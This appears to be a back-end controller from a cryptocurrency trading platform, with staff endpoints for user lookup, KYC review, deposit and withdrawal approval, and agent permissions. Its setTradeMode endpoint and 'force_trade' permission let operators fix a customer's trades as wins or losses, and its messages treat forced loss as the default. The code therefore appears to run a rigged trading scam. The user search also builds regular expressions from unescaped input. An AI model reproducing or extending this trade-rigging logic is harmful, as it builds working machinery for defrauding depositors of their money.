const User = require('../models/User');
const Transaction = require('../models/Transaction');
const Recharge = require('../models/Recharge');
const DepositRequest = require('../models/DepositRequest');
const WithdrawRequest = require('../models/WithdrawRequest');
const bcrypt = require('bcryptjs');

const ALL_PERMISSIONS = ['kyc_approve', 'force_trade', 'manage_deposits', 'manage_withdrawals', 'view_users'];

// ─── Agent-callable: User list ────────────────────────────────────────────────

// GET /api/agent/users
const getUsers = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;
    const search = req.query.search || '';

    const baseFilter = { role: 'user' };
    const filter = search
      ? { ...baseFilter, $or: [{ email: new RegExp(search, 'i') }, { username: new RegExp(search, 'i') }] }
      : baseFilter;

    const [users, total] = await Promise.all([
      User.find(filter).select('-password').sort({ createdAt: -1 }).skip(skip).limit(limit),
      User.countDocuments(filter),
    ]);

    res.json({ users, pagination: { page, limit, total, pages: Math.ceil(total / limit) } });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch users.' });
  }
};

// ─── Agent-callable: KYC ─────────────────────────────────────────────────────

// PATCH /api/agent/users/:id/kyc
const reviewKyc = async (req, res) => {
  try {
    const { status } = req.body;
    if (!['verified', 'rejected'].includes(status)) {
      return res.status(400).json({ error: 'Status must be verified or rejected.' });
    }
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { kycStatus: status },
      { new: true }
    ).select('-password');
    if (!user) return res.status(404).json({ error: 'User not found.' });
    res.json({ message: `KYC ${status} for ${user.username}`, user });
  } catch {
    res.status(500).json({ error: 'Failed to update KYC.' });
  }
};

// ─── Agent-callable: Trade Mode ───────────────────────────────────────────────

// PATCH /api/agent/users/:id/trademode
const setTradeMode = async (req, res) => {
  try {
    const { tradeMode } = req.body;
    if (!['win', 'loss'].includes(tradeMode)) {
      return res.status(400).json({ error: 'tradeMode must be win or loss.' });
    }
    const user = await User.findByIdAndUpdate(req.params.id, { tradeMode }, { new: true });
    if (!user) return res.status(404).json({ error: 'User not found.' });
    res.json({
      message: tradeMode === 'win' ? 'Force win enabled for user' : 'User returned to forced loss',
      tradeMode: user.tradeMode,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── Agent-callable: Deposits ─────────────────────────────────────────────────

// GET /api/agent/deposit-requests
const getDepositRequests = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip = (page - 1) * limit;
    const status = req.query.status || '';
    const filter = status ? { status } : {};

    const [requests, total] = await Promise.all([
      DepositRequest.find(filter)
        .sort({ createdAt: -1 })
        .skip(skip)
        .limit(limit)
        .populate('user', 'username email demo_balance'),
      DepositRequest.countDocuments(filter),
    ]);

    res.json({ requests, pagination: { page, limit, total, pages: Math.ceil(total / limit) } });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch deposit requests.' });
  }
};

// PATCH /api/agent/deposit-requests/:id/approve
const approveDepositRequest = async (req, res) => {
  try {
    const { adminNote } = req.body;
    const depositReq = await DepositRequest.findById(req.params.id).populate('user');
    if (!depositReq) return res.status(404).json({ error: 'Deposit request not found.' });
    if (depositReq.status !== 'pending') {
      return res.status(400).json({ error: 'This request has already been reviewed.' });
    }

    const user = await User.findById(depositReq.user._id);
    if (!user) return res.status(404).json({ error: 'User not found.' });

    const balanceBefore = user.demo_balance;
    user.demo_balance = (user.demo_balance || 0) + depositReq.amount;
    user.total_recharged = (user.total_recharged || 0) + depositReq.amount;
    await user.save();

    depositReq.status = 'approved';
    depositReq.adminNote = adminNote || '';
    depositReq.reviewedAt = new Date();
    depositReq.reviewedBy = req.user._id;
    await depositReq.save();

    await Transaction.create({
      user: user._id,
      type: 'deposit',
      coin: depositReq.coin,
      amount: depositReq.amount,
      usdValue: depositReq.amount,
      balanceBefore,
      balanceAfter: user.demo_balance,
      description: `Deposit approved: ${depositReq.amount} ${depositReq.coin} via ${depositReq.network}`,
    });

    await Recharge.create({
      user: user._id,
      amount: depositReq.amount,
      bonus: 0,
      plan: user.plan || 'none',
      status: 'completed',
    });

    res.json({
      message: `Deposit of ${depositReq.amount} ${depositReq.coin} approved.`,
      newBalance: user.demo_balance,
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to approve deposit.' });
  }
};

// PATCH /api/agent/deposit-requests/:id/reject
const rejectDepositRequest = async (req, res) => {
  try {
    const { adminNote } = req.body;
    const depositReq = await DepositRequest.findById(req.params.id);
    if (!depositReq) return res.status(404).json({ error: 'Deposit request not found.' });
    if (depositReq.status !== 'pending') {
      return res.status(400).json({ error: 'This request has already been reviewed.' });
    }

    depositReq.status = 'rejected';
    depositReq.adminNote = adminNote || '';
    depositReq.reviewedAt = new Date();
    depositReq.reviewedBy = req.user._id;
    await depositReq.save();

    res.json({ message: 'Deposit request rejected.' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to reject deposit.' });
  }
};

// ─── Agent-callable: Withdrawals ──────────────────────────────────────────────

// GET /api/agent/withdraw-requests
const getWithdrawRequests = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = 20;
    const skip = (page - 1) * limit;
    const status = req.query.status || '';
    const filter = status ? { status } : {};

    const [requests, total] = await Promise.all([
      WithdrawRequest.find(filter)
        .sort({ createdAt: -1 })
        .skip(skip)
        .limit(limit)
        .populate('user', 'username email demo_balance'),
      WithdrawRequest.countDocuments(filter),
    ]);

    res.json({ requests, pagination: { page, limit, total, pages: Math.ceil(total / limit) } });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch withdraw requests.' });
  }
};

// PATCH /api/agent/withdraw-requests/:id/approve
const approveWithdrawRequest = async (req, res) => {
  try {
    const { adminNote } = req.body;
    const wReq = await WithdrawRequest.findById(req.params.id);
    if (!wReq) return res.status(404).json({ error: 'Request not found.' });
    if (wReq.status !== 'pending') return res.status(400).json({ error: 'Already reviewed.' });

    wReq.status = 'approved';
    wReq.adminNote = adminNote || '';
    wReq.reviewedAt = new Date();
    wReq.reviewedBy = req.user._id;
    await wReq.save();

    res.json({ message: `Withdrawal of $${wReq.amount} approved.` });
  } catch (err) {
    res.status(500).json({ error: 'Failed to approve withdrawal.' });
  }
};

// PATCH /api/agent/withdraw-requests/:id/reject
const rejectWithdrawRequest = async (req, res) => {
  try {
    const { adminNote } = req.body;
    const wReq = await WithdrawRequest.findById(req.params.id);
    if (!wReq) return res.status(404).json({ error: 'Request not found.' });
    if (wReq.status !== 'pending') return res.status(400).json({ error: 'Already reviewed.' });

    // Refund user balance
    const user = await User.findById(wReq.user);
    if (user) {
      const balanceBefore = user.demo_balance;
      user.demo_balance = parseFloat((user.demo_balance + wReq.amount).toFixed(2));
      await user.save();

      await Transaction.create({
        user: user._id,
        type: 'admin_credit',
        coin: 'USDT',
        amount: wReq.amount,
        usdValue: wReq.amount,
        balanceBefore,
        balanceAfter: user.demo_balance,
        description: `Withdrawal rejected — $${wReq.amount} refunded`,
      });
    }

    wReq.status = 'rejected';
    wReq.adminNote = adminNote || '';
    wReq.reviewedAt = new Date();
    wReq.reviewedBy = req.user._id;
    await wReq.save();

    res.json({ message: `Withdrawal rejected. $${wReq.amount} refunded to user.` });
  } catch (err) {
    res.status(500).json({ error: 'Failed to reject withdrawal.' });
  }
};

// ─── Admin-only: Agent Management ────────────────────────────────────────────

// GET /api/admin/agents
const listAgents = async (req, res) => {
  try {
    const agents = await User.find({ role: 'agent' })
      .select('-password')
      .sort({ createdAt: -1 });
    res.json({ agents });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch agents.' });
  }
};

// POST /api/admin/agents
const createAgent = async (req, res) => {
  try {
    const { username, email, password, permissions = [] } = req.body;
    if (!username || !email || !password) {
      return res.status(400).json({ error: 'username, email and password are required.' });
    }
    const invalidPerms = permissions.filter(p => !ALL_PERMISSIONS.includes(p));
    if (invalidPerms.length) {
      return res.status(400).json({ error: `Invalid permissions: ${invalidPerms.join(', ')}` });
    }

    const existing = await User.findOne({ $or: [{ email: email.toLowerCase() }, { username }] });
    if (existing) {
      return res.status(400).json({ error: 'Username or email already in use.' });
    }

    const agent = await User.create({
      username,
      email: email.toLowerCase(),
      password,
      role: 'agent',
      agentPermissions: permissions,
    });

    res.status(201).json({ message: 'Agent created successfully.', agent: agent.toSafeObject() });
  } catch (error) {
    res.status(500).json({ error: 'Failed to create agent.' });
  }
};

// PATCH /api/admin/agents/:id/permissions
const updateAgentPermissions = async (req, res) => {
  try {
    const { permissions } = req.body;
    if (!Array.isArray(permissions)) {
      return res.status(400).json({ error: 'permissions must be an array.' });
    }
    const invalidPerms = permissions.filter(p => !ALL_PERMISSIONS.includes(p));
    if (invalidPerms.length) {
      return res.status(400).json({ error: `Invalid permissions: ${invalidPerms.join(', ')}` });
    }

    const agent = await User.findOne({ _id: req.params.id, role: 'agent' });
    if (!agent) return res.status(404).json({ error: 'Agent not found.' });

    agent.agentPermissions = permissions;
    await agent.save();

    res.json({ message: 'Agent permissions updated.', agentPermissions: agent.agentPermissions });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update agent permissions.' });
  }
};

// PATCH /api/admin/agents/:id/ban
const banAgent = async (req, res) => {
  try {
    const { ban, reason } = req.body;
    const agent = await User.findOne({ _id: req.params.id, role: 'agent' });
    if (!agent) return res.status(404).json({ error: 'Agent not found.' });

    agent.isBanned = !!ban;
    agent.banReason = ban ? (reason || 'Banned by admin') : '';
    agent.bannedAt = ban ? new Date() : null;
    await agent.save();

    res.json({ message: ban ? 'Agent banned.' : 'Agent unbanned.', isBanned: agent.isBanned });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

module.exports = {
  // Agent-callable
  getUsers, reviewKyc, setTradeMode,
  getDepositRequests, approveDepositRequest, rejectDepositRequest,
  getWithdrawRequests, approveWithdrawRequest, rejectWithdrawRequest,
  // Admin-only
  listAgents, createAgent, updateAgentPermissions, banAgent,
};
